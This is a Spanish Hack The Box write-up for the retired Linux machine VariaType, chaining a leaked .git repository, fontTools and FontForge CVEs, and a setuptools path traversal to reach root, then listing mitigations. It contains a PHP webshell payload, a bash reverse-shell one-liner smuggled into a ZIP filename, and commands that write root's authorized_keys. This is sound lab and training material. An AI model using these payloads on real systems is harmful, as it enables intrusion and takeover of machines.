---
machine: VariaType
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, git-disclosure, fonttools, fontforge, setuptools, cve-2025-47273]
---

# VariaType — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Cadena de tres CVEs en herramientas tipográficas. Un `.git` expuesto filtra credenciales del portal interno; **CVE-2025-66034** (fontTools varLib) escribe un webshell PHP a través de un `.designspace` con CDATA; **CVE-2024-25082** (FontForge) inyecta comandos en el nombre de un ZIP y da shell como `steve`; y el cargador de plugins que corre con `sudo` usa un setuptools vulnerable, **CVE-2025-47273**, para escribir una clave en `/root/.ssh/authorized_keys`.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
ffuf -u http://<IP> -H "Host: FUZZ.variatype.htb" -w subdomains.txt -mc 200,403
```

```text
22/tcp  ssh
80/tcp  http
```

```text
git.variatype.htb   -> repositorio expuesto
dev.variatype.htb   -> portal de subida (interno)
```

## Foothold: .git y credenciales

```bash
wget -r http://git.variatype.htb/.git/
cd git.variatype.htb && git log --all --oneline
git log -p | grep -iE "password|api_key|token"
```

Aparece una contraseña en un commit revertido que da acceso al portal de fuentes (`dev.variatype.htb`).

## 2. CVE-2025-66034: escritura de fichero con fontTools

El procesado de fuentes variables escribe en disco rutas derivadas del `.designspace`. Con CDATA se cuela contenido fuera del XML esperado:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<designspace format="5.0">
  <sources>
    <source filename="../../../../var/www/html/shell.php" name="x">
      <![CDATA[<?php system($_GET['c']); ?>]]>
    </source>
  </sources>
</designspace>
```

```bash
curl 'http://variatype.htb/shell.php?c=id'
```

Shell como `www-data`.

## 3. CVE-2024-25082: FontForge

El flujo de validación llama a FontForge con el nombre del ZIP del usuario:

```bash
filename="x;bash -c 'bash -i >& /dev/tcp/<IP>/4445 0>&1';.zip"
```

El nombre se interpola en el comando del sistema y se ejecuta como `steve`.

## 4. Root: cargador de plugins y setuptools

```bash
sudo -l
```

```text
(root) NOPASSWD: /usr/bin/python3 /opt/plugin_loader.py *
```

El script descarga un paquete con `PackageIndex.download(url, tmpdir)`, y **CVE-2025-47273** permite que el nombre derive fuera del directorio temporal:

```bash
python3 -m http.server 8000     # sirviendo ../../../root/.ssh/authorized_keys
sudo /usr/bin/python3 /opt/plugin_loader.py http://<IP>:8000/wheel
ssh -i id_ed25519 root@<IP>
```

## Evidencia (redactada)

```text
/home/steve/user.txt  -> <user_flag>
/root/root.txt        -> <root_flag>
```

## Lecciones

- Un `.git` expuesto sigue siendo oro: el historial conserva secretos que nadie borró del árbol.
- La inyección por CDATA/XML en herramientas de fuentes (fontTools, FontForge) es la nueva frontera de SSTI.
- `setuptools` confió históricamente en nombres remotos; cualquier script que descargue paquetes es un sink de traversal.
- Mitigación: `.git` fuera del webroot, versiones parcheadas de fontTools/FontForge/setuptools y `sudo` sin comodines en los argumentos.
